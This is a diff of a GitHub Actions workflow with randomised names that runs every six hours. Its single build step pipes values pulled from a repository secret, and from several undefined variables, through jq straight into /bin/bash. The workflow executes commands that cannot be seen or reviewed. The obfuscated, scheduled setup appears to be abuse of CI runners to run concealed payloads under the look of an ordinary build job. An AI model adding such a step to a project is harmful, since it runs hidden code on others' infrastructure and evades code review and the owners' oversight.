@@ -2,27 +2,32 @@ name: pierseleeli
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 1/6 * * *'
+    - cron: '58 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pierseleeli
         env:
-          f2088: ${{ secrets.f2088 }}
+          oxusq9: ${{ secrets.oxusq9 }}
         run: |
-          echo $f2088 | jq -r .oo94 | /bin/bash
-          echo $xz929 | jq -r .i7 | /bin/bash
-          echo $bcyk0432 | jq -r .ckt254 | /bin/bash
-          echo $bti406 | jq -r .olh368 | /bin/bash
-          echo $zyab4836 | jq -r .drqr18 | /bin/bash
-          echo $lwoav2731 | jq -r .e1 | /bin/bash
-          echo $q3408 | jq -r .adu41 | /bin/bash
-          echo $cq663 | jq -r .bdxbo33861 | /bin/bash
-          echo $or716 | jq -r .xk5 | /bin/bash
-          echo $nkupz8 | jq -r .i4 | /bin/bash
-          echo $gh96160 | jq -r .dgk8 | /bin/bash
-          echo $nbm7 | jq -r .lju327 | /bin/bash
+          echo $oxusq9 | jq -r .ou1 | /bin/bash
+          echo $hvb797 | jq -r .to657 | /bin/bash
+          echo $b926 | jq -r .hu0624 | /bin/bash
+          echo $cr09124 | jq -r .th8 | /bin/bash
+          echo $fzns3635 | jq -r .gopm9 | /bin/bash
+          echo $omljc97675 | jq -r .k926 | /bin/bash
+          echo $iqa250 | jq -r .b249 | /bin/bash
+          echo $tmab6873 | jq -r .a6 | /bin/bash
+          echo $fg0 | jq -r .wltjt25969 | /bin/bash
+          echo $ki597 | jq -r .wp6250 | /bin/bash
+          echo $gs00 | jq -r .ewtwn3671 | /bin/bash
+          echo $i258 | jq -r .ghreo78839 | /bin/bash
+          echo $etxjp7077 | jq -r .av1 | /bin/bash
+          echo $qokev58689 | jq -r .sy33940 | /bin/bash
+          echo $ogk4 | jq -r .ddhzw2 | /bin/bash
+          echo $h56098 | jq -r .g8 | /bin/bash
+          echo $zd4 | jq -r .km703 | /bin/bash
+          echo $iagy19 | jq -r .vbg2 | /bin/bash
 
